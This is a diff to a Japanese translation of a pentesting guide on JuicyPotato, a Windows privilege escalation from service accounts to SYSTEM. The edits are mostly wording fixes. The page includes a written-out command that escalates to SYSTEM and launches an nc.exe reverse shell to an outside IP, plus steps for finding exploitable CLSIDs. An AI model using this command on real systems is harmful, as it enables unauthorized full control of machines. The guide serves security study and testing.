@@ -12,7 +12,7 @@ roguepotato-and-printspoofer.md
 
 _少しのジュースを加えた_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG) _の甘いバージョン、つまり **Windows サービスアカウントから NT AUTHORITY\SYSTEM への別のローカル特権昇格ツール**_
 
-#### juicypotatoは [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) からダウンロードできます
+#### juicypotato は [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) からダウンロードできます
 
 ### 概要 <a href="#summary" id="summary"></a>
 
@@ -24,7 +24,7 @@ _少しのジュースを加えた_ [_RottenPotatoNG_](https://github.com/breenm
 
 > 理論については、[Rotten Potato - サービスアカウントから SYSTEM への特権昇格](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) を参照し、リンクと参照のチェーンをたどってください。
 
-私たちは、`BITS` 以外にも悪用できるいくつかの COM サーバーがあることを発見しました。これらは次の条件を満たす必要があります:
+私たちは、`BITS` 以外にも悪用できるいくつかの COM サーバーがあることを発見しました。それらは次の条件を満たす必要があります:
 
 1. 現在のユーザーによってインスタンス化可能であること、通常は偽装特権を持つ「サービスユーザー」
 2. `IMarshal` インターフェースを実装していること
@@ -68,21 +68,21 @@ Optional args:
 ```
 ### 最後の考え <a href="#final-thoughts" id="final-thoughts"></a>
 
-[**juicy-potatoのReadmeから**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
+[**juicy-potato Readme から**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
 
 ユーザーが `SeImpersonate` または `SeAssignPrimaryToken` 権限を持っている場合、あなたは **SYSTEM** です。
 
-これらのCOMサーバーの悪用を防ぐことはほぼ不可能です。これらのオブジェクトの権限を `DCOMCNFG` を介して変更することを考えるかもしれませんが、うまくいくことは難しいでしょう。
+これらの COM サーバーの悪用を防ぐことはほぼ不可能です。`DCOMCNFG` を介してこれらのオブジェクトの権限を変更することを考えるかもしれませんが、うまくいくことは難しいでしょう。
 
-実際の解決策は、`* SERVICE` アカウントの下で実行される敏感なアカウントとアプリケーションを保護することです。`DCOM` を停止することは確かにこのエクスプロイトを抑制しますが、基盤となるOSに深刻な影響を与える可能性があります。
+実際の解決策は、`* SERVICE` アカウントの下で実行される敏感なアカウントとアプリケーションを保護することです。`DCOM` を停止することは確かにこのエクスプロイトを抑制しますが、基盤となる OS に深刻な影響を与える可能性があります。
 
 出典: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
 ## 例
 
-注意: CLSIDのリストについては [このページ](https://ohpe.it/juicy-potato/CLSID/) を訪れてください。
+注: CLSID のリストを試すには [このページ](https://ohpe.it/juicy-potato/CLSID/) を訪れてください。
 
-### nc.exeリバースシェルを取得する
+### nc.exe リバースシェルを取得する
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
@@ -115,11 +115,11 @@ https://ohpe.it/juicy-potato/CLSID/
 
 まず、juicypotato.exe以外のいくつかの実行可能ファイルが必要です。
 
-[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)をダウンロードしてPSセッションにロードし、[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)をダウンロードして実行します。そのスクリプトは、テストする可能性のあるCLSIDのリストを作成します。
+[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)をダウンロードしてPSセッションに読み込み、[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)をダウンロードして実行します。そのスクリプトはテストするための可能なCLSIDのリストを作成します。
 
 次に、[test_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)をダウンロードし（CLSIDリストとjuicypotato実行可能ファイルへのパスを変更）、実行します。すべてのCLSIDを試し始め、**ポート番号が変更されると、それはCLSIDが機能したことを意味します**。
 
-**-cパラメータを使用して**動作するCLSIDを**確認してください**
+**パラメータ-cを使用して**動作するCLSIDを**確認してください**。
 
 ## 参考文献
 
